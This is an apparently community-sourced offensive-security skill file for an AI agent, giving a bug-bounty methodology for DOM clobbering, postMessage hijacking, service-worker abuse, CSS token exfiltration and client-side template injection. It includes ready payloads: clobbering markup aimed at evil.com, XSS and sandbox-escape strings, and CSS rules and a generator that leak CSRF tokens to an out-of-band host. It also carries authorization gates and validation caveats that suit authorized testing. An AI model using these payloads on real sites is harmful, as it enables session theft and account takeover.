---
name: hunt-dom
description: Hunt client-side DOM vulnerabilities
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
sources: portswigger_research, hackerone_public, github_security_advisories
report_count: 14
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

# HUNT-DOM — DOM Clobbering / PostMessage / Service Worker / CSS Exfil

## Crown Jewel Targets

DOM-based attacks execute in the victim's browser — some sources never reach the server, while others do; assess the actual data path rather than assuming WAF/input filters are irrelevant. PostMessage missing-origin-check = cross-origin token theft with no XSS needed.

**Highest-value chains:**
- **DOM Clobbering → DOM-XSS / auth bypass** — HTML *markup* injection (no `<script>`) overwrites a JS global like `window.config` or a form named property, and the app later treats that value as a URL/code → sink fires under a markup-only injection where script is filtered.
- **PostMessage no origin check → session theft / DOM-XSS** — a `message` handler that trusts `event.data` without validating `event.origin` lets an attacker iframe/opener drive privileged actions or feed a sink.
- **Service Worker abuse** — register a **same-origin** SW script (reachable because of an authorized same-origin JavaScript upload/path) via stored XSS → intercept all in-scope `fetch` → persistent credential capture.
- **CSS Exfil** — attribute-value selectors (`input[value^="a"]`) leak a CSRF token / API key / nonce char-by-char to an OOB host with zero JS.

### Grounding — public research this is distilled from
- **DOM Clobbering / DOM-Invader** — Gareth Heyes & the PortSwigger Web Security Academy "DOM clobbering" topic; DOM-Invader ships a dedicated clobbering scanner. Sink taxonomy maps to the academy's DOM-based vulnerability labs.
- **DOMPurify clobbering & mXSS bypasses** — Michał Bentkowski (Securitum) blog series on bypassing HTML sanitizers via clobbering and mutation XSS.
- **jQuery `htmlPrefilter` self-closing-tag XSS** — **CVE-2020-11022** and **CVE-2020-11023** (jQuery < 3.5.0). Passing attacker HTML to `.html()` / `.append()` mutates into executing markup. Grep bundled jQuery version; this is one of the most common real-world DOM-XSS roots.
- **CSS exfiltration** — d0nut "CSS Injection Attacks" / "Stealing Data With CSS" research (sequential `@import` recursion to drop the per-char-position constraint).
> Cite only what you reproduce. Do not paste these as "proof" in a report — your PoC against the live target is the evidence. Named research here is for *technique provenance*, not severity inflation.

---

## Attack Surface Signals

```
# Injection points that allow MARKUP but may strip <script>:
user bio / display name / comment / markdown preview / SVG upload / CMS rich-text

# postMessage endpoints (iframes, SSO widgets, payment frames, chat widgets):
*/sso/*  */embed/*  */widget/*  */oauth/*  /sdk.js  pay/checkout iframes

# Service worker presence:
/sw.js  /service-worker.js  /firebase-messaging-sw.js  /ngsw-worker.js (Angular)

# CSS injection points:
?theme=  custom-css profile field  email-template editor  style= passthrough
```

---

## Phase 1 — DOM Clobbering

```bash
# Signal: app reads element IDs/names as if they were JS objects, OR feeds a
# clobberable global into a sink (location, innerHTML, eval, script.src).
# Inject MARKUP (no script) at a sink that lets named/id'd elements through.

# Single-level clobber of window.config:
#   <a id="config" href="https://evil.com">
# Clobber a NON-built-in global the app reads (built-in methods like getElementById can't be shadowed this way):
#   <a id="config"></a><a id="config" name="url">   # window.config.url resolves to an attacker-controlled element/string
# Clobber a string-coerced URL value (anchor toString() == href):
#   <a id="x"></a><a id="x" name="y" href="https://evil.com">   # x.y -> href
# Nested window.a.b.c via form/inputs:
#   <form id="a"><input id="b" name="c" value="clobbered"></form>
# baseURI / relative-URL hijack:
#   <base href="https://evil.com/">      # bends every relative src/href
```

```javascript
// Browser console: find globals that are clobberable AND reach a sink.
// A var only matters if the app later concatenates it into a URL/HTML/eval.
const susp = ['config','settings','options','appConfig','init','data','user',
  'token','csrf','nonce','baseUrl','apiUrl','cdn','redirect','next','debug'];
susp.forEach(k => {
  const v = window[k];
  // HTMLCollection / element => already clobbered or clobberable namespace
  if (v && (v instanceof Element || v instanceof HTMLCollection))
    console.log('[CLOBBERED/NAMESPACE]', k, v);
  else if (v !== undefined) console.log('[GLOBAL TYPE]', k, typeof v);
});
```

```bash
# Source review: find globals fed into sinks (this is what makes clobbering exploitable)
curl -s "https://$TARGET/" | grep -nE \
  "document\.(getElementById|baseURI)|window\.[A-Za-z_]+\.(url|src|href|html|cmd)|\
location\s*=\s*[A-Za-z_]|\.innerHTML\s*=|eval\(|new Function\(|\.src\s*=\s*[A-Za-z_]"
# DOM-Invader (Burp) → enable "DOM clobbering" — it auto-finds clobberable sources→sinks.
```

**jQuery angle:** if the bundle ships jQuery < 3.5.0, attacker HTML passed to `.html()`/`.append()` self-mutates to execute (**CVE-2020-11022 / CVE-2020-11023**). Confirm version then test `<style><style /><img src=x onerror=alert(document.domain)>`.

---

## Phase 2 — PostMessage Hijacking

Two bug classes: (a) **listener** trusts cross-origin data → drive a sink/privileged action; (b) **sender** broadcasts secrets with target origin `'*'` → any framing page reads them.

```bash
# Find handlers and flag the ones with NO origin check
grep -rnE "addEventListener\(\s*['\"]message['\"]|onmessage\s*=" recon/$TARGET/ --include="*.js" 2>/dev/null \
  | grep -vE "\.origin\b" 
# Then for each, read +/- 20 lines: where does event.data go? (innerHTML/eval/location/token store)
# Senders that leak: grep for postMessage(<secret>, '*')
grep -rnE "postMessage\([^,]+,\s*['\"]\*['\"]\)" recon/$TARGET/ --include="*.js" 2>/dev/null
```

```html
<!-- Controlled lab with a test account and approved target origin. -->
<iframe id="f" src="https://target.example/test-listener"></iframe>
<script>
const frame = document.getElementById('f');
frame.addEventListener('load', () => {
  frame.contentWindow.postMessage({type: 'test-canary', value: 'DOM-REVIEW-042'},
                                  'https://target.example');
}, {once: true});
addEventListener('message', event => {
  if (event.origin !== 'https://target.example' || event.source !== frame.contentWindow) return;
  console.log('Controlled message received:', typeof event.data); // No secret dump.
});
</script>
```

This canary alone is not a finding. Trace the actual authorized handler and sink,
then use a harmless marker matched to its schema. Prove impact with controlled
accounts; never send cookies, complete DOM, bearer tokens or messages to a third
party OOB service merely to demonstrate receipt.

> False-positive guard: a handler with a *partial* check (`origin.indexOf('target.com')>-1`, `endsWith('target.com')`, regex `target\.com`) is still vulnerable — bypass with `target.com.evil.com` or `eviltarget.com`. Confirm by serving the PoC from such a look-alike host and showing the message still lands.

---

### PostMessage initialization assumptions

Browser-dispatched `postMessage` has its sender origin initialized when the event
is created; it does not later become trustworthy during frame loading. An opaque
origin can serialize as `"null"`; never treat it as an allowed trusted origin.
Test first-message trust only with a bounded synthetic canary and explicit scope,
not a tight message flood. Validate exact origin, expected `event.source` and a
bounded message schema together. [HTML messaging standard](https://html.spec.whatwg.org/multipage/web-messaging.html).

## Phase 3 — Service Worker Abuse

**Hard rule (corrects a common mistake):** a SW script URL **must be same-origin** as the page calling `register()`. A cross-origin script URL (`https://evil.com/sw.js`) throws `SecurityError` — there is **no header that enables cross-origin SW *script* registration**. `Service-Worker-Allowed` only widens the **scope** a same-origin script may control, not where the script may live.

So the realistic path is: get a SW script **onto the target origin** (approved file upload that directly serves JavaScript without redirects, a JSON/JSONP endpoint with `text/javascript`, or an existing route under your control), then register it from same-origin XSS.

```bash
# Enumerate existing SW + its scope
curl -s "https://$TARGET/" | grep -iE "serviceWorker\.register|navigator\.serviceWorker"
for p in sw.js service-worker.js firebase-messaging-sw.js ngsw-worker.js; do
  curl -s -o /dev/null -w "%{http_code} $p\n" "https://$TARGET/$p"; done
curl -s "https://$TARGET/sw.js" | grep -iE "scope|addEventListener\('fetch'|caches"
# Look for an upload/route that returns Content-Type: text/javascript on YOUR content:
#   curl -s -D- https://$TARGET/uploads/<id> | grep -i content-type
```

Service-worker test design: use a disposable origin/browser profile, serve an
inert same-origin JavaScript worker, and request a dedicated canary URL in its
approved scope. Record scope/control status without reading authorization headers
or response bodies. Await activation and control separately from registration;
registration success alone does not show interception or persistence. Unregister
the test worker and remove only test-created caches at the end.

Top-level service-worker script redirects fail; an open redirect is not a route
to cross-origin registration. MIME, secure context, scope, CSP, activation and
browser storage state matter. A `SecurityError` has multiple possible causes,
not just wrong origin. See [Service Workers specification](https://www.w3.org/TR/service-workers/).

## Phase 4 — CSS Injection / Exfiltration

```bash
# Prereq: attacker controls CSS (custom-theme field, style= passthrough, email
# template, markdown CSS). Targets: hidden CSRF input, API key in meta, nonce attr.
# Step 1 confirm injection: inject "color:red" on a known element, observe render.
# Step 2 leak attribute values char-by-char via attribute selectors + url() to OOB.
```

> **Scope caveat (corrects an overstatement):** CSS exfil bypasses CSP that blocks *script execution* — it does **not** bypass a CSP whose `style-src` / `img-src` / `default-src` / `connect-src` restricts external origins, or `form-action`. If `img-src 'self'` is set, `url(https://OOB/...)` is **blocked**. Always read the live `Content-Security-Policy` header first; if external resource origins are locked down, CSS exfil is dead and you should say so rather than claim it.

```css
/* One request fires only for the matching first char. */
input[name="csrf"][value^="a"] { background: url(https://OOB.example/c?p=0&c=a); }
input[name="csrf"][value^="b"] { background: url(https://OOB.example/c?p=0&c=b); }
/* ...all chars... then chain @import to leak position 1 conditioned on position 0, etc. */
/* Hidden inputs and meta elements do not normally paint a background.
   A controlled lab may use a matching visible sibling selector instead. */
```

```python
# Generate a single-position CSS exfil set (loop positions with sequential @import in practice)
import string
chars = string.ascii_letters + string.digits + '-_'
attr, oob, pos = 'name="csrf"', 'https://OOB.example/c', 0
print("\n".join(
  f'input[{attr}][value^="{c}"]{{background:url({oob}?p={pos}&c={c})}}' for c in chars))
# Real exfil needs recursion: serve a stylesheet whose @import pulls the next
# position's rules only after the current prefix matched (d0nut technique) —
# this removes the "static input, one char" limitation.
```

> Validation: the proof is **OOB hits**, not a rendered color. Stand up a Collaborator / request-bin and show one hit per correct character forming the synthetic test canary; use an authorized controlled-account action only if separately needed to establish impact. No callback alone is inconclusive: CSP, rendering and request routing can block it (a 0-byte image or CSP-blocked request looks identical to success in DevTools).

---

## Phase 5 — dangerouslySetInnerHTML / framework sinks

```bash
grep -rnE "dangerouslySetInnerHTML|v-html=|\[innerHTML\]=|\.html\(" recon/$TARGET/ --include="*.js" 2>/dev/null
# In minified Next/React bundles:
curl -s "https://$TARGET/_next/static/chunks/pages/index.js" | grep -oP 'dangerouslySetInnerHTML.{0,120}'
# Trace whether user data reaches it WITHOUT a sanitizer (DOMPurify/sanitize-html).
# If DOMPurify IS present, check for clobbering/mXSS bypass (Bentkowski research) and version.
```

---

## Phase 6 — Client-Side Template Injection

```bash
# Detect framework, then test the {{}} sink in a sandbox-bypass form.
grep -rnE "angular|vue|handlebars|mustache|nunjucks|alpinejs|\bv-|ng-app" recon/$TARGET/ --include="*.js" 2>/dev/null | head
# Probe (server may render, so confirm it's CLIENT-side by viewing rendered DOM, not curl):
#   {{7*7}}  -> 49 in the live DOM (not in raw HTML) => CSTI
# AngularJS sandbox-escape style payloads (version-dependent; older 1.x):
#   {{constructor.constructor('alert(document.domain)')()}}
# Vue: {{_c.constructor('alert(1)')()}}    (varies by Vue 2/3 build)
```

---

## Chain Table

| DOM finding | Chain to | Impact |
|-------------|----------|--------|
| DOM Clobbering → clobbered URL into `script.src`/`location` | DOM-XSS under markup-only injection | High / auth bypass |
| PostMessage no/weak origin check (listener) | data → innerHTML/eval/location sink | DOM-XSS → ATO |
| PostMessage `targetOrigin:'*'` sender | any framing page reads token/auth code | Cross-origin token theft |
| CSS exfil (OOB-confirmed) | leak CSRF token → fire CSRF | CSRF chain (Medium+) |
| Same-origin Service Worker via XSS | intercept all in-scope fetch + auth headers | Persistent ATO (Critical) |
| dangerouslySetInnerHTML, no sanitizer | stored DOM-XSS | XSS → ATO |

---

## Tools

```bash
# DOM Invader (built into Burp browser) — sources→sinks, postMessage logger, clobbering scanner
# postMessage-tracker — Chrome extension logging cross-window messages
# Burp Collaborator / interactsh / request-bin — only an approved synthetic-canary OOB sink for CSS-exfil & SW PoCs
# Verify any tool URL before citing it in a report; do not paste unverified repo links.
```

---

## Validation (false-positive discipline)

Match the repo standard: a technique that *fires in DevTools* needs reproducible evidence of an attacker-controlled source reaching a meaningful sink; OOB and state changes are not mandatory for every class.

- **DOM Clobbering** — show the clobbered value actually reaching a sink (XSS payload executes, or app navigates/loads from attacker URL). A clobberable global that never reaches a sink = no impact, do not report.
- **PostMessage** — distinguish a *missing* check from a *weak* one; bypass weak checks from a look-alike origin and capture via OOB. A noisy `message` log alone is not proof — show the privileged action or token exfil.
- **CSS exfil** — Use reproducible synthetic-canary evidence; an OOB callback is one possible proof. Read CSP first: `img-src`/`style-src`/`connect-src`/`default-src` restricting external origins kills it. A blocked `url()` is indistinguishable from success in the Network tab — confirm on the Collaborator side.
- **Service Worker** — registration must be **same-origin script**; a `SecurityError` means you cited the wrong origin. Prove *persistence* (close tabs → reopen → fresh OOB hit, no XSS re-fire).
- **General** — unique per-test markers (`btoa(domain)+nonce`) so an OOB hit is attributable to YOUR payload and not background traffic; body-diff the rendered DOM, not the raw HTML, since these are client-side.

**Potential severity (requires actual reach, privileges, scope and program rubric):**
- Same-origin Service Worker → persistent credential intercept: **Critical**
- PostMessage data → DOM-XSS / token theft → ATO: **High–Critical**
- DOM Clobbering → DOM-XSS reaching auth/session: **High**
- CSS exfil of CSRF token (OOB-proven) → CSRF: **Medium** (raise if the chained CSRF is account-critical)

## When to Use

- You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
